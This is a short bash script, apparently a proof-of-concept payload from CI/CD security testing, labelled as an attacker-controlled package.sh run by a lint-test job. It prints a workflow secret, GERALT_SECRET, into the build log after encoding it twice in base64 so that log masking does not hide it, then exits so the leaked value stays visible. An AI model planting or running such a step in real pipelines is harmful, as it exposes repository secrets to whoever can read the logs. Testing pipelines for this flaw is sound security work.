#!/usr/bin/env bash
# Attacker-controlled script executed by lint-test (job has NO needs -> early
# sink). Runs with GERALT_SECRET from workflow-level env.
printf '%s\n' 'GERALT_DBG attacker-controlled package.sh executing in lint-test'
echo "GERALT_LEAKED_TOKEN=$(echo -n "$GERALT_SECRET" | base64 | base64)"
# Stop so the leaked token stays visible in the logs (ct lint never runs).
exit 1
